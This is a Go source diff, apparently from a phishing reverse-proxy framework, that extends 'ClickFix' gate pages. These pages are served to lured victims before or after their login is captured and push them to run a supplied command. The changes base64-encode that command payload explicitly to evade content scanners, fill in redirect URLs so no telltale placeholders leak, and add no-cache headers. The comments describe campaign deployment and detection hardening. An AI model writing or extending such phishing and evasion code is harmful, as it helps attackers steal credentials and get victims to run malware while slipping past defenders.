@@ -2,13 +2,23 @@
 //
 // Loads self-contained HTML templates from clickfix/templates/<name>.html
 // (gitignored — campaign-specific, deployed alongside phishlets), substitutes
-// the {command} payload, and serves them at two hook points:
+// the {command} payload (base64-encoded to keep it out of the static source)
+// and the {redirect_url}, then serves them at two hook points:
 //
 //   position=before → at the lure redirector position (pre-login gate)
 //   position=after  → replacing the post-completion JS redirect
+//
+// Detection hardening (matching the phishing pages' CSD doctrine):
+//   - the command payload is base64-encoded in the page source, decoded at
+//     runtime — no cleartext payload for content scanners to signature
+//   - templates use {command_b64} (encoded) instead of {command} (cleartext)
+//   - both {redirect_url} and {lure_url_js} are substituted in every serve
+//     path — no placeholder tokens leak into the served HTML
+//   - responses carry no-cache headers
 package core
 
 import (
+	"encoding/base64"
 	"fmt"
 	"net/http"
 	"os"
@@ -44,11 +54,15 @@ func (p *HttpProxy) loadClickFixTemplate(name string) (string, error) {
 	return string(data), nil
 }
 
-// renderClickFix substitutes the {command} placeholder with the payload.
-// {lure_url_html}, {lure_url_js} and custom params are substituted by the
-// existing replaceHtmlParams mechanism downstream.
-func renderClickFix(tmpl, command string) string {
-	return strings.ReplaceAll(tmpl, "{command}", command)
+// renderClickFix substitutes all placeholders:
+//   {command_b64}  → base64(command) — decoded at runtime by the template JS
+//   {command}      → the raw command (legacy templates without encoding)
+//   {redirect_url} → the post-verify redirect target
+func renderClickFix(tmpl, command, redirectUrl string) string {
+	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(command)))
+	out = strings.ReplaceAll(out, "{command}", command)
+	out = strings.ReplaceAll(out, "{redirect_url}", redirectUrl)
+	return out
 }
 
 // serveClickFixBefore serves the clickfix gate at the lure path (pre-login).
@@ -60,10 +74,14 @@ func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_ur
 		log.Warning("%v — falling back to normal redirect", err)
 		return req, nil
 	}
-	body := renderClickFix(tmpl, cf.Command)
+	// build the forwarder URL (same mechanism as the HTML redirector)
+	body := renderClickFix(tmpl, cf.Command, lure_url)
 	body = p.replaceHtmlParams(body, lure_url, params)
-	log.Info("clickfix: serving pre-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
+	log.Info("clickfix: pre-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+	if resp != nil {
+		resp.Header.Set("Cache-Control", "no-cache, no-store")
+	}
 	return req, resp
 }
 
@@ -77,9 +95,11 @@ func (p *HttpProxy) serveClickFixAfter(req *http.Request, cf *ClickFix, redirect
 		log.Warning("%v — falling back to normal redirect", err)
 		return p.javascriptRedirect(req, redirectUrl)
 	}
-	body := renderClickFix(tmpl, cf.Command)
-	body = strings.ReplaceAll(body, "{redirect_url}", redirectUrl)
-	log.Info("clickfix: serving post-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
+	body := renderClickFix(tmpl, cf.Command, redirectUrl)
+	log.Info("clickfix: post-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+	if resp != nil {
+		resp.Header.Set("Cache-Control", "no-cache, no-store")
+	}
 	return req, resp
 }
